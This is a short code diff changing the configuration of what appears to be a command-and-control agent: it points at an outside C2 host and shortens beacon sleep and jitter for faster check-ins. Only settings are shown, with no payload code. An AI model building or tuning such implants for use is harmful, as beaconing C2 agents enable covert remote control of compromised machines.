@@ -18,8 +18,8 @@ from datetime import datetime
 # ─── Configuration ─────────────────────────────────────────────────────────────
 C2_URL   = os.environ.get("C2_URL",    "https://gbctwoserver.pages.dev")
 AGENT_ID = os.environ.get("AGENT_ID",  str(uuid.uuid4()))
-SLEEP    = int(os.environ.get("SLEEP",  "5"))
-JITTER   = int(os.environ.get("JITTER", "10"))
+SLEEP    = int(os.environ.get("SLEEP",  "3"))  # Faster beacon for better tracking
+JITTER   = int(os.environ.get("JITTER", "5"))   # Lower jitter
 ENC_KEY  = os.environ.get("ENC_KEY",   "")
 AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")
 DEBUG    = os.environ.get("C2_DEBUG",  "1")  # Enable debug by default
